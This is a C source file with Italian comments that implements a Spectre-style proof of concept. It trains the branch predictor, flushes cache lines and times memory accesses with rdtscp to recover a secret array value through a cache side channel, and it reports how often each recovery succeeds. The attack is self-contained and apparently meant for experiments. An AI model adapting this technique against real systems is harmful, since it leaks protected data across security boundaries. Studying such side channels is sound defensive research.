/*
 * spark.c
 *
 *  Created on: 02 lug 2018
 *      Author: Marco
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <x86intrin.h> // per usare rdtscp e clflush

/*************** Codice vittima ***************/

#define SIZE 3000
uint8_t unused1[64];
unsigned int secret[SIZE];
uint8_t unused2[64];
unsigned int array2[SIZE];
uint8_t unused3[64];
unsigned int passwordDigest[SIZE];

uint8_t temp = 0;

void victim_function(int userID, int pwd) {
	if (pwd == passwordDigest[userID]) {
		temp = array2[secret[userID]];
	}
}

/******************** Main ********************/
int main(int argn, char *argv[]) {

#define CACHELINE 512

	// verifica se gli argomenti sono in numero giusto
	// 1 - number of runs
	// 2 - number of tests
	// 3 - cache hit threshold
	// 4 - precision loss

	if (argn - 1 != 4) {
		printf(
				"Illegal number of arguments. It must be 4 (#round, #test, #threshold, precisionLoss\n");
		exit(1);
	}

	// parametri

	// numero di round per test
	int numberOfRuns = strtol(argv[1], NULL, 10);
	// numero di test
	int numberOfTest = strtol(argv[2], NULL, 10);
	// soglia cache hit
	int cacheHitThreshold = strtol(argv[3], NULL, 10);
	// precisione dei risultati
	int precisionLoss = strtol(argv[4], NULL, 10);
	// numero di bit occupati da ogni posizione dell'array
	int blocks = sizeof(array2[0]) * 8;
	// numero di elementi in una line
	int delta = CACHELINE / blocks;
	// classi di risultati
	int class = SIZE / delta + 1;

	// contatori
	int ok = 0;
	int error = 0;
	int noHit = 0;

	// array risultati
	int results[class];
	unsigned int timeReg;
	register uint64_t time1, time2;

	/* inizializzo il seme del generatore
	 random per avere risultati diversi ad ogni test*/
	srand(time(NULL));

	// per ogni test
	for (int t = 1; t <= numberOfTest; t++) {

		printf("Test %d di %d\n", t, numberOfTest);

		// scelgo casualmente l'user da attaccare
		int userUnderAttack = rand() % SIZE;

		// inizializzo casualmente gli array
		for (int i = 0; i < SIZE; i++) {
			passwordDigest[i] = rand() % SIZE;
			array2[i] = rand() % SIZE;
			secret[i] = rand() % SIZE;
		}

		// scelgo password sicuramente sbagliata
		int wrongPassword = passwordDigest[userUnderAttack] + 1;

		// inizializzo a 0 l'array risultati
		for (int i = 0; i < class; i++) {
			results[i] = 0;
		}

		// per ogni run
		for (int j = 0; j < numberOfRuns; j++) {

			//addestro il branch predictor
			for (int i = 0; i < 3; i++) {
				victim_function(1, passwordDigest[1]);
			}

			// flushing array2 e passwordDigest dalla cache
			for (int i = 0; i < SIZE; i++) {
				_mm_clflush(&array2[i]);
				_mm_clflush(&passwordDigest[i]);
			}

			// aspetto che le operazioni in memoria vengano eseguite
			_mm_lfence();

			// richiamo la funzione vittima con l'ID da attaccare
			// e la password sbagliata
			victim_function(userUnderAttack, wrongPassword);

			_mm_lfence();

			for (int l = 1; l <= class; l++) {

				// calcolo il tempo di accesso alla posizione l
				time1 = __rdtscp(&timeReg);
				timeReg = array2[l * delta];
				time2 = __rdtscp(&timeReg) - time1;

				_mm_lfence();

				// aggiorno la posizione corrispondente di results
				// se il tempo <= della soglia
				if ((int) time2 <= cacheHitThreshold) {
					results[l]++;
				}
			}
		}

		// cerco il massimo nell'array dei risultati
		int max = -1;
		int index = -1;
		for (int i = 0; i < class; i++) {
			if (results[i] >= max) {
				max = results[i];
				index = i;
			}
		}

		// stampo il risultato confrontando il candidato
		// con il piu alto numero di occorrenze e lo confronto con il segreto
		// assicurandomi che ci sia almeno una occorrenza
		int rangeMax =
				((index + 1 + precisionLoss) * delta >= SIZE) ?
						SIZE : (index + 1 + precisionLoss) * delta;
		int rangeMin =
				((index - precisionLoss) * delta <= 0) ?
						0 : (index - precisionLoss) * delta;

		if (results[index] > 0 && rangeMin <= secret[userUnderAttack]
				&& rangeMax >= secret[userUnderAttack]) {
			printf("OK: prediction between %d and %d, secret = %d\n", rangeMin,
					rangeMax, secret[userUnderAttack]);
			ok++;
		} else if (results[index] == 0) {
			printf("+++++ NO-HIT: detected 0 hit in %d rounds +++++\n",
					numberOfRuns);
			noHit++;
		} else {
			printf(
					"----- ERROR: prediction between %d and %d, secret = %d -----\n",
					rangeMin, rangeMax, secret[userUnderAttack]);
			error++;
		}
	}

	// stampo il conteggio totale degli errori e degli ok
	printf("***TOTAL***\nOK -> %d\nNO-HIT -> %d\nERROR -> %d\n", ok, noHit,
			error);

	return (0);
}
